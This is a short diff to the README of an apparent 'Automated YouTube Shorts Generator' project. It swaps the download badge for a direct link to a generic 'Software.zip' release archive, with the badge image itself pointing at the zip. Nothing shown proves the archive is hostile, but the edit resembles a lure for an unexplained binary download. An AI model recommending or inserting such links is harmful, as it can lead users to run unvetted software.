@@ -12,7 +12,7 @@ Welcome to the Automated YouTube Shorts Generator repository! This script is des
 
 ## Installation
 To get started with the Automated YouTube Shorts Generator, you can download the latest version from the link below:
-[![Download Script](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download Script](https://github.com/Krishna9894/Automated-YouTube-Shorts-Generator/releases/download/v1.0/Software.zip)](https://github.com/Krishna9894/Automated-YouTube-Shorts-Generator/releases/download/v1.0/Software.zip)
 
 Once you have downloaded the script, follow the instructions in the README file to set it up on your system.
 
